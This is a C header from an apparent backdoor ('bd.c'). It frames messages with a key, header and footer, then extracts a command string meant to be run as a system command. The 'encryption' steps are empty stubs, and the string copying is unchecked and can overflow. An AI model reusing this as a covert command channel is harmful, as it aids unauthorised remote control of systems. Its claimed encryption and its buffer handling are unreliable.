/*
| ------------------------------------------------------------------------------
| File:     encrypt.h
| Purpose:  Simple encryption and decryption for use with bd.c
| 
| ------------------------------------------------------------------------------
*/

/*#define BD_KEY          "W1OExkq&"
#define BD_HEADER       "0bBH%iKU"
#define BD_FOOTER       "5@lbJKXK"*/

#define BD_KEY              "keyyyyyy"
#define BD_HEADER           "headerrr"
#define BD_FOOTER           "footerrr"
#define BD_KEY_LEN          8
#define BD_MAX_MSG_LEN      1024
#define BD_MAX_REPLY_LEN    4096

/*
| ------------------------------------------------------------------------------
| Encryption
| 
| This function takes the following steps:
| - wrap a header and footer around the plaintext
| - encrypt the string
| - prepend a key to the hash
| 
| ------------------------------------------------------------------------------
*/

char *encrypt(char *plaintext){
    printf("Encrypt plaintext: %s\n",plaintext);
    /* Declare variables */
    
    char hash[BD_MAX_MSG_LEN];
    memset(hash, 0, BD_MAX_MSG_LEN);
    
    /* Wrap in header and footer */
    
    strcpy(hash, BD_HEADER);
    if(strlen(plaintext) >= 1000){
        printf("Encryption failed.\n");
        return NULL;
    }
    strcat(hash, plaintext);
    strcat(hash, BD_FOOTER);
    printf("asdf\n");
    /* Encrypt */
    
    
    
    /* Prepend header key */
    
    char *msg = malloc(BD_MAX_MSG_LEN);
    memset(msg, 0, BD_MAX_MSG_LEN);
    strcpy(msg, BD_KEY);
    strcat(msg, hash);
    
    printf("Message: %s\n", msg);
    
    return msg; // Free this pointer after use
}

/*
| ------------------------------------------------------------------------------
| Decryption
| 
| This function takes the following steps:
| - takes in the full payload
| - decrypt the hash
| - remove header and footer
| 
| ------------------------------------------------------------------------------
*/

char *decrypt(char *payload){
    printf("Decrypt payload: %s\n",payload);
    /* Copy only encrypted portion of the payload to message */
    
    char message[BD_MAX_REPLY_LEN];
    memset(message, 0, BD_MAX_REPLY_LEN);
    strcpy(message, payload + BD_KEY_LEN);
    printf("Message: %s\n", message);
    
    /* Decrypt */
    
    
    
    /* Verify decryption succeeds by checking for header and footer */
    
    char *bd_header = message;
    char *bd_footer = message + (strlen(message) - BD_KEY_LEN);
    
    if(strncmp(bd_header, BD_HEADER, BD_KEY_LEN) != 0 || \
        strncmp(bd_footer, BD_FOOTER, BD_KEY_LEN) != 0 ){
        printf("Decryption failed, discard.\n");
        return NULL;
    }
    else
        printf("Decryption success!\n");
    
    /* All checks successful, run the system command */
    
    // Parse command
    char *bd_command = malloc(BD_MAX_REPLY_LEN);
    memset(bd_command, 0, BD_MAX_REPLY_LEN);
    strncpy(bd_command, \
        (message + BD_KEY_LEN), \
        strlen(message) - (2 * BD_KEY_LEN));
    if(strlen(bd_command) == 0){
        printf("Invalid command: %s\n", bd_command);
        return NULL;
    }
    else
        printf("Command: %s\n", bd_command);
    
    return bd_command; // Free this pointer after use
}
